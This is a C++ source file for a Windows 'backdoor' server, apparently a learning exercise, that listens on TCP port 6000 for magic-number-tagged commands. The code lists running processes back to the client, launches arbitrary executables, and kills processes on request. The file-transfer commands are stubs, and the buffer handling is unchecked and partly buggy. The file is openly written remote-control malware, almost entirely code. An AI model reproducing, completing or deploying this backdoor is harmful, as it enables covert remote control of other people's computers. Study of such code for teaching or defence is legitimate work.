// backdoor_server.cpp : Defines the entry point for the console application.
//

#define WIN32_LEAN_AND_MEAN

#include "stdafx.h"
#include <windows.h>
#include <winsock2.h>
#include <tlhelp32.h>

#include "backdoor_protocol.h"

// Need to link with Ws2_32.lib
#pragma comment(lib, "ws2_32.lib")

#define PORT_NUM 6000
#define RECEIVE_BUFLEN 1024

//
// Functions
//
int SendAck(SOCKET connectSocket);
int SendNAK(SOCKET connectSocket);
BOOL KillProcess(DWORD pid);
BOOL ExecuteProcess(WCHAR* exe_path);
BOOL EnumerateProcesses(SOCKET connectSocket);

int _tmain(int argc, _TCHAR* argv[])
{
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;

    SOCKET server_socket = INVALID_SOCKET;

    sockaddr_in service; // socket address to bind to

    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested, 
        &wsaData);
    if (err != 0) 
    {
        // Check if error = WSAVERNOTSUPPORTED and if is --
        // It means ws2_32.dll is too old.  This system needs a serious update.
        wprintf(L"WSAStartup failed with error: %d\n", err);

        return -1;
    }


    //
    // Create a socket 
    //
    server_socket = socket(AF_INET, 
        SOCK_STREAM, 
        IPPROTO_TCP);
    if (server_socket == INVALID_SOCKET) 
    {
        wprintf(L"Create socket failed. Error: %u\n", WSAGetLastError());

        WSACleanup();

        return -1;
    }

    //
    // Fill in sockaddr_in -- Address family, IP address, port
    //
    service.sin_family = AF_INET;
    service.sin_addr.s_addr = inet_addr("127.0.0.1");    //(INADDR_ANY);     //("127.0.0.1");
    service.sin_port = htons(PORT_NUM);

    //
    // Bind the socket
    //

    err = bind(server_socket, 
        (SOCKADDR *) &service, 
        sizeof (service));
    if (err == SOCKET_ERROR)
    {
        wprintf(L"Bind failed. Error: %u\n", WSAGetLastError());

        closesocket(server_socket);
        WSACleanup();

        return -1;
    }

    //
    // Listen for incoming connections
    //

    if (listen(server_socket, 
        SOMAXCONN) == SOCKET_ERROR)
    {
        wprintf(L"Listen() failed.  Error: %d\n", WSAGetLastError());

        closesocket(server_socket);
        WSACleanup();

        return -1;
    }

    wprintf(L"Listening on port: %d\n", PORT_NUM);

    //
    // Accept connections
    //
    SOCKET connectSocket;

    connectSocket = accept(server_socket, 
        NULL, 
        NULL);
    if (connectSocket == INVALID_SOCKET) 
    {
        wprintf(L"Accept() failed.  Error: %ld\n", WSAGetLastError());

        closesocket(server_socket);
        WSACleanup();

        return -1;
    } 

    wprintf(L"New client connected!\n");


    //
    // Receive Data
    //

    char recvbuf[RECEIVE_BUFLEN];

    int bytes_received = recv(connectSocket, 
        recvbuf, 
        sizeof(recvbuf),
        0);
    if ( bytes_received > 0 )
    {
        wprintf(L"Bytes received: %d\n", bytes_received);
    }

    //
    // Verify valid backdoor msg
    //

    // IMPORTANT:  For future need to check proper receive length

    char* buf_ptr = recvbuf;

    if(*((DWORD*)buf_ptr) == BACKDOOR_MAGIC_NUMBER)
    {
        wprintf(L"Valid Backdoor message!\n");

        buf_ptr += sizeof(DWORD);

        switch( *((BACKDOOR_MSG*)buf_ptr))
        {
        case BKDOOR_HEARTBEAT:

            wprintf(L"BKDOOR_HEARTBEAT received!\n");

            SendAck(connectSocket);

            break;

        case BKDOOR_PUT_FILE:

            wprintf(L"BKDOOR_PUT_FILE received!\n");

            break;

        case BKDOOR_GET_FILE:
            wprintf(L"BKDOOR_GET_FILE received!\n");
            break;

        case BKDOOR_GET_PROCESS_LIST:
            {
                wprintf(L"BKDOOR_GET_PROCESS_LIST received!\n");

                if(EnumerateProcesses(connectSocket))
                {
                    SendAck(connectSocket);
                }
                else
                {
                    SendNAK(connectSocket);
                }
            }
            break;

        case BKDOOR_EXECUTE_PROCESS:
            {
                wprintf(L"BKDOOR_EXECUTE_PROCESS received!\n");

                BKDOOR_PROCESS_REQ req = *((BKDOOR_PROCESS_REQ*)recvbuf);

                if(ExecuteProcess(req.szExeFile))
                {
                    SendAck(connectSocket);
                }
                else
                {
                    SendNAK(connectSocket);
                }
            }

            break;


        case BKDOOR_KILL_PROCESS:
            {
                wprintf(L"BKDOOR_KILL_PROCESS received!\n");

                BKDOOR_PROCESS_REQ req = *((BKDOOR_PROCESS_REQ*)recvbuf);

                if(KillProcess(req.th32ProcessID))
                {
                    SendAck(connectSocket);
                }
                else
                {
                    SendNAK(connectSocket);
                }
            }

            break;

        default:
            wprintf(L"Error: Unknown message received!\n");
            break;
        }
    }

    //
    // Cleanup
    //

    closesocket(connectSocket);
    closesocket(server_socket);
    WSACleanup();

    return 0;
}

int SendAck(SOCKET connectSocket)
{
    //
    // Send Data
    //

    BACKDOOR_MSG msg = BKDOOR_ACK;

    int bytes_sent = send(connectSocket,
        (const char*) &msg,
        sizeof(msg),
        0);
    if(bytes_sent == SOCKET_ERROR)
    {
        wprintf(L"Send() failed.  Error: %ld\n", WSAGetLastError());
    }
    else
    {
        wprintf(L"Bytes sent: %d\n", bytes_sent);
    }

    return 0;
}

int SendNAK(SOCKET connectSocket)
{
    //
    // Send Data
    //

    BACKDOOR_MSG msg = BKDOOR_NAK;

    int bytes_sent = send(connectSocket,
        (const char*) &msg,
        sizeof(msg),
        0);
    if(bytes_sent == SOCKET_ERROR)
    {
        wprintf(L"Send() failed.  Error: %ld\n", WSAGetLastError());
    }
    else
    {
        wprintf(L"Bytes sent: %d\n", bytes_sent);
    }

    return 0;
}

BOOL KillProcess(DWORD pid)
{
    BOOL retVal = FALSE;

    HANDLE hProcess;

    hProcess = OpenProcess (PROCESS_TERMINATE, FALSE, pid);

    if (hProcess != NULL)
    {
        if (TerminateProcess(hProcess, 0))
        {
            retVal = TRUE;
        }
        CloseHandle (hProcess);
    }
    else 
    {
        wprintf (L"OpenProcess failed. Error: %u\n", GetLastError());
    }

    return retVal;
}

BOOL ExecuteProcess(WCHAR* exe_path)
{
    BOOL retVal = FALSE;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory (&si, sizeof(si));
    si.cb = sizeof (si);
    ZeroMemory( &pi, sizeof(pi));

    if (CreateProcess(NULL, exe_path, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        retVal = TRUE;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return retVal;
}

BOOL EnumerateProcesses(SOCKET connectSocket)
{
    BOOL retVal = FALSE;

    HANDLE         hProcessSnap = NULL; 
    BOOL           bRet      = FALSE; 
    PROCESSENTRY32 pe32      = {0}; 

    //  Take a snapshot of all processes in the system. 
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 

    if (hProcessSnap == (HANDLE)-1) 
    {
        return (FALSE); 
    }

    //  Fill in the size of the structure before using it. 

    pe32.dwSize = sizeof(PROCESSENTRY32); 

    //  Walk the snapshot of the processes, and for each process, 
    //  display information. 

    if (Process32First(hProcessSnap, &pe32)) 
    { 
        BKDOOR_PROCESS_INFO process_info;
        BOOL          bGotModule = FALSE; 
        MODULEENTRY32 me32       = {0};

        do 
        { 
            process_info.th32ProcessID = pe32.th32ProcessID;
            wcscpy(process_info.szExeFile, pe32.szExeFile);

            // send back to client
            send(connectSocket,
                (const char*) &process_info,
                sizeof(process_info),
                0);
            Sleep(3000);
        } 
        while (Process32Next(hProcessSnap, &pe32)); 

        retVal = TRUE; 

        /*send delimator back to client */
        wcscpy(process_info.szExeFile, L"%done%");  // process name


        send(connectSocket,
            (const char*) &process_info,
            sizeof(process_info),
            0);
    } 
    else 
    {
        retVal = FALSE;    // could not walk the list of processes 
    }

    CloseHandle (hProcessSnap); 

    return retVal;
}